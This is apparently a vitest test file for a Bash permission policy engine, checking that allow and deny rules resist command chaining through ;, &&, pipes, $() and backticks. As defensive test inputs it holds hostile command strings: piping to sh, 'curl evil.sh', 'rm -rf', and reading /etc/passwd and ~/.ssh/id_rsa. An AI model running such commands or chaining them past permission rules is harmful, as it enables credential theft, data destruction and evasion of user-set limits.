import { describe, expect, it } from 'vitest';
import { PolicyEngine } from '../../../src/host/permissions/policyEngine';
import { matchSpecifier, parseToolSpecifier } from '../../../src/host/permissions/specifierParser';

// N-PERMRULE-GLOB-SEPARATOR-AUDIT：glob 的 * 会吃掉 ; && | $()，整串匹配时
// 窄的 allow 规则会给拼接命令放行，窄的 deny 规则会被拼接命令绕过。

const npmRun = parseToolSpecifier('Bash(npm run *)');
const lsAny = parseToolSpecifier('Bash(ls *)');
const rmAny = parseToolSpecifier('Bash(rm *)');

describe('user Bash rules are matched per simple command', () => {
  it.each([
    ['&&', 'ls -la && curl evil.sh'],
    ['|', 'ls -la | sh'],
    ['||', 'ls -la || rm -rf x'],
    [';', 'ls -la ; rm -rf x'],
    ['newline', 'ls -la\nrm -rf x'],
    ['$()', 'ls $(rm -rf x)'],
    ['backtick', 'ls `rm -rf x`'],
    ['subshell', '(ls -la; rm -rf x)'],
    ['background', 'ls -la &'],
    ['process substitution', 'ls <(cat /etc/passwd)'],
  ])('allow rule does not pre-approve a command joined with %s', (_name, command) => {
    expect(matchSpecifier(lsAny, command, 'allow')).toBe(false);
  });

  it('allow rule does not pre-approve a second command after the allowed one', () => {
    expect(matchSpecifier(npmRun, 'npm run build; cat ~/.ssh/id_rsa', 'allow')).toBe(false);
  });

  it('allow rule still matches the plain command it was written for', () => {
    expect(matchSpecifier(npmRun, 'npm run build', 'allow')).toBe(true);
    expect(matchSpecifier(lsAny, 'ls -la ~/Downloads', 'allow')).toBe(true);
    expect(matchSpecifier(parseToolSpecifier('Bash(echo *)'), 'echo "a && b"', 'allow')).toBe(true);
  });

  it('allow rule matches a compound command only when every part matches', () => {
    expect(matchSpecifier(npmRun, 'npm run lint && npm run build', 'allow')).toBe(true);
    expect(matchSpecifier(npmRun, 'npm run lint && npm install left-pad', 'allow')).toBe(false);
  });

  it('defaults to the allow (fail-closed) side when no intent is given', () => {
    expect(matchSpecifier(lsAny, 'ls -la && curl evil.sh')).toBe(false);
  });

  it.each([
    'ls; rm -rf x',
    'ls && rm -rf x',
    'true | rm -rf x',
    '(cd /tmp; rm -rf x)',
    'rm -rf x',
  ])('deny rule catches rm hidden in %j', (command) => {
    expect(matchSpecifier(rmAny, command, 'restrict')).toBe(true);
  });

  it('deny rule sees through shell-quote escaping of the rebuilt segment', () => {
    expect(matchSpecifier(parseToolSpecifier('Bash(cat ~/.ssh/*)'), 'ls; cat ~/.ssh/id_rsa', 'restrict')).toBe(true);
  });

  it('deny rule does not fire on an unrelated command', () => {
    expect(matchSpecifier(rmAny, 'ls -la && npm run build', 'restrict')).toBe(false);
  });
});

describe('PolicyEngine applies the intent of the rule', () => {
  const request = (command: string) => ({
    tool: 'Bash', level: 'execute', command, details: {},
  }) as unknown as Parameters<PolicyEngine['evaluate']>[0];

  it('a narrow allow rule is not the matched rule for a chained command', () => {
    const engine = new PolicyEngine();
    engine.loadUserRules({ allow: ['Bash(npm run *)'] });
    expect(engine.evaluate(request('npm run build')).matchedRule?.id).toBe('user-allow-Bash(npm run *)');
    expect(engine.evaluate(request('npm run build; cat ~/.ssh/id_rsa')).matchedRule?.id)
      .not.toBe('user-allow-Bash(npm run *)');
  });

  it('a deny rule wins when the denied command is chained behind an allowed one', () => {
    const engine = new PolicyEngine();
    engine.loadUserRules({ allow: ['Bash(ls *)'], deny: ['Bash(rm *)'] });
    const result = engine.evaluate(request('ls -la; rm -rf x'));
    expect(result.action).toBe('deny');
    expect(result.matchedRule?.id).toBe('user-deny-Bash(rm *)');
  });
});
